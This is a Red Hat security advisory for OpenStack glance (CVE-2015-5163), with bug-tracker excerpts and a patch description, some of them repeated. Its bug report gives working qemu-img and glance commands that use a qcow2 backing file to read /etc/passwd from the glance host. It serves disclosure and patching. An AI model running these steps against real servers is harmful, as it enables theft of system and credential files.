Security Advisory: Important

## Red Hat Insights patch analysis

Identify and remediate systems affected by this advisory.

[View affected systems](https://console.redhat.com/insights/patch/advisories/RHSA-2015%3A1639)

## Topic

Updated openstack-glance packages that fix one security issue are now
available for Red Hat Enterprise Linux OpenStack Platform 7.0.

Red Hat Product Security has rated this update as having an Important
security impact. Common Vulnerability Scoring System (CVSS) base scores,
which give detailed severity ratings, are available for each vulnerability
from the CVE links in the References section.

## Description

OpenStack Image Service (glance) provides discovery, registration, and
delivery services for disk and server images. It provides the ability to
copy or snapshot a server image and immediately store it away. Stored
images can be used as a template to get new servers up and running quickly
and more consistently than installing a server operating system and
individually configuring additional services.

A flaw was found in the OpenStack Image Service (glance) import task
action. When processing a malicious qcow2 header, glance could be
tricked into reading an arbitrary file from the glance host. Only
setups using the glance V2 API are affected by this flaw. (CVE-2015-5163)

Red Hat thanks the OpenStack team for reporting this issue. Upstream
acknowledges Eric Harney of Red Hat as the original reporter.

All openstack-glance users are advised to upgrade to these updated
packages, which address this vulnerability.

## Solution

Before applying this update, ensure all previously released errata relevant
to your system have been applied.

By importing a qcow2 image with a malicious backing file, an authenticated user may mislead Glance import task action, resulting in the disclosure of any file on the Glance server for which the Glance process user has access to. Only setups using the Glance V2 API are affected by this flaw.  Proposed patch: See attached patches. Unless a flaw is discovered in them, these patches will be merged to stable/kilo and master on the public disclosure date.   ```  [Comment 1](show_bug.cgi?id=1252378#c1)  Vasyl Kaigorodov    2015-08-11 09:37:16 UTC  ``` Created [attachment 1061407](attachment.cgi?id=1061407 "cve-2015-5163-master-liberty.patch") [[details]](attachment.cgi?id=1061407&action=edit "cve-2015-5163-master-liberty.patch") cve-2015-5163-master-liberty.patch   ```  [Comment 2](show_bug.cgi?id=1252378#c2)  Vasyl Kaigorodov    2015-08-11 09:37:19 UTC  ``` Created [attachment 1061408](attachment.cgi?id=1061408 "cve-2015-5163-stable-kilo.patch") [[details]](attachment.cgi?id=1061408&action=edit "cve-2015-5163-stable-kilo.patch") cve-2015-5163-stable-kilo.patch   ```  [Comment 3](show_bug.cgi?id=1252378#c3)  Vasyl Kaigorodov    2015-08-11 09:39:39 UTC  ``` Acknowledgements:  Red Hat would like to thank the OpenStack team for reporting this issue.

### Bug Description

This is a security flaw that allows files from the Glance host to be obtained by a user.

I'm using the Glance file store and have set in /etc/glance/glance-api.conf:

[taskflow\_executor]

engine\_mode=serial # not sure if needed

conversion\_format=raw

Make a malicious image available via HTTP.

$ sudo qemu-img create -f qcow2 /var/www/html/test\_image 1M

$ sudo qemu-img rebase -u -b /etc/passwd /var/www/html/test\_image

$ glance --os-image-api-version 2 task-create --type import --input '{"import\_from\_format": "qcow2", "import\_from": "<http://127.0.0.1/test_image>", "image\_properties": {"name": "my\_image\_test", "disk\_format": "qcow2", "container\_format": "bare"}}'

$ glance image-download my\_image\_test --file downloaded\_image

$ head downloaded\_image

<contents from /etc/passwd on the Glance host>

This happens because Glance runs this command which doesn't specify a format, and uses qemu-img's format auto-detection:

qemu-img convert -O raw file:///tmp/28e1f5e8-9f62-4c01-84be-9feae8852ea4 /tmp/28e1f5e8-9f62-4c01-84be-9feae8852ea4.converted

Similar to Cinder [bug 1415087](/bugs/1415087).

Looks like the timing of that addition makes it kilo-only. Still we need a kilo series task added to this bug to track the backport change for the stable/kilo branch.

The impact description looks good to me, but note that we've got 2015.1.1 sneaking up on us RSN so even if it doesn't take long to fix we'll likely need to change the affects line.

Don't import files with backed files

There's a security issue where it'd be possible to import images with

    backed files using the task engine and then use/convert those to access

    system files or any other file in the system. An example of an attack

    would be to import an image with a backing file pointing to

    `/etc/passwd`, then convert it to raw and download the generated image.

This patch forbids importing files with baking files entirely. It does

    that in the `\_ImportToFS` task, which is the one that imports the image

    locally to then execute other tasks on it. It's not necessary for the

    `\_ImportToStore` task because other tasks won't be executed when the

    image is imported in the final store.

commit d529863a1e8d2307526bdb395b4aebe97f81603d

Author: Flavio Percoco <email address hidden>

Don't import files with backed files

There's a security issue where it'd be possible to import images with

    backed files using the task engine and then use/convert those to access

    system files or any other file in the system. An example of an attack

    would be to import an image with a backing file pointing to

    `/etc/passwd`, then convert it to raw and download the generated image.

This patch forbids importing files with baking files entirely. It does

    that in the `\_ImportToFS` task, which is the one that imports the image

    locally to then execute other tasks on it. It's not necessary for the

    `\_ImportToStore` task because other tasks won't be executed when the

    image is imported in the final store.

### Bug Description

This is a security flaw that allows files from the Glance host to be obtained by a user.

I'm using the Glance file store and have set in /etc/glance/glance-api.conf:

[taskflow\_executor]

engine\_mode=serial # not sure if needed

conversion\_format=raw

Make a malicious image available via HTTP.

$ sudo qemu-img create -f qcow2 /var/www/html/test\_image 1M

$ sudo qemu-img rebase -u -b /etc/passwd /var/www/html/test\_image

$ glance --os-image-api-version 2 task-create --type import --input '{"import\_from\_format": "qcow2", "import\_from": "<http://127.0.0.1/test_image>", "image\_properties": {"name": "my\_image\_test", "disk\_format": "qcow2", "container\_format": "bare"}}'

$ glance image-download my\_image\_test --file downloaded\_image

$ head downloaded\_image

<contents from /etc/passwd on the Glance host>

This happens because Glance runs this command which doesn't specify a format, and uses qemu-img's format auto-detection:

qemu-img convert -O raw file:///tmp/28e1f5e8-9f62-4c01-84be-9feae8852ea4 /tmp/28e1f5e8-9f62-4c01-84be-9feae8852ea4.converted

Similar to Cinder [bug 1415087](/bugs/1415087).

Looks like the timing of that addition makes it kilo-only. Still we need a kilo series task added to this bug to track the backport change for the stable/kilo branch.

The impact description looks good to me, but note that we've got 2015.1.1 sneaking up on us RSN so even if it doesn't take long to fix we'll likely need to change the affects line.

If these two last patchs are correct and if we can send the pre-OSSA by early Monday, the disclosure date could be:

2015-08-13, 1500UTC

Does that sounds good ?

Don't import files with backed files

There's a security issue where it'd be possible to import images with

    backed files using the task engine and then use/convert those to access

    system files or any other file in the system. An example of an attack

    would be to import an image with a backing file pointing to

    `/etc/passwd`, then convert it to raw and download the generated image.

This patch forbids importing files with baking files entirely. It does

    that in the `\_ImportToFS` task, which is the one that imports the image

    locally to then execute other tasks on it. It's not necessary for the

    `\_ImportToStore` task because other tasks won't be executed when the

    image is imported in the final store.

## Environment considerations

Red Hat Enterprise Linux starting with versions 6.1 and 5.7 introduced a new Red Hat Subscription Management (RHSM) service. Red Hat Network (RHN) has been decommissioned.

Users that are new to Red Hat or would like the enhanced subscription information and improved content access should use RHSM. If you are still using Red Hat Network, we advise you to [migrate to RHSM as soon as possible](https://access.redhat.com/products/red-hat-subscription-management#migration). Customers using older versions of Red Hat Enterprise Linux must continue using RHN Classic. Refer to [FAQ for Changes to Red Hat's Entitlement Platform with RHEL 6.1 and 5.7](https://access.redhat.com/articles/47844) and [What's the difference between management services provided by Red Hat Network (RHN) Classic and Red Hat Subscription Management (RHSM)?](https://access.redhat.com/articles/63269) for more information on benefits of RHSM over RHN.

* For **Red Hat Enterprise Linux 9**, register the system using RHSM as described in [Registering the system with the Subscription Manager](#rhsm). Then update the system according to instructions in [Applying package updates on Red Hat Enterprise Linux 9](#rhel9).
* For **Red Hat Enterprise Linux 8**, register the system using RHSM as described in [Registering the system with the Subscription Manager](#rhsm). Then update the system according to instructions in [Applying package updates on Red Hat Enterprise Linux 8](#rhel8).
* For **Red Hat Enterprise Linux 7**, register the system using RHSM as described in [Registering the system with the Subscription Manager](#rhsm). Then update the system according to instructions in [Applying package updates on Red Hat Enterprise Linux 7](#rhel7).
* For **Red Hat Enterprise Linux 6**, register the system using RHSM (if RHEL 6.1 or above) as described in [Registering the system with the Subscription Manager](#rhsm). Then update the system according to instructions in [Applying package updates on Red Hat Enterprise Linux 6](#rhel6).
* For **Red Hat Enterprise Linux 5**, register the system using RHSM (if RHEL 5.7 or above) as described in [Registering the system with the Subscription Manager](#rhsm). After registration, update the system according to instructions in [Applying package updates on Red Hat Enterprise Linux 5](#rhel5).
* If your system cannot connect to the Internet directly, our [Red Hat Satellite](https://access.redhat.com/products/red-hat-satellite/) offering may be of interest.

#### Command line

A system can also be registered via the command line by using the "subscription-manager" command. To register your system, either through the GUI or from the command line, follow the instructions in the [Using and Configuring Red Hat Subscription Manager](https://access.redhat.com/documentation/en-US/Red_Hat_Subscription_Management/1/html-single/RHSM/index.html) guide.

Make sure that your firewall allows configuring RHSM, for more information see [How do I access RHSM (yum) through a firewall?](https://access.redhat.com/solutions/65300).

General information on RHSM can be found in [Red Hat Network Subscription Management](https://access.redhat.com/documentation/en-US/Red_Hat_Customer_Portal/1/html/Red_Hat_Network_Certificate-based_Subscription_Management/index.html), while [FAQ for Changes to Red Hat's Entitlement Platform with RHEL 6.1 and 5.7](/knowledge/node/47844) provides a quick overview and a comparison with RHN.
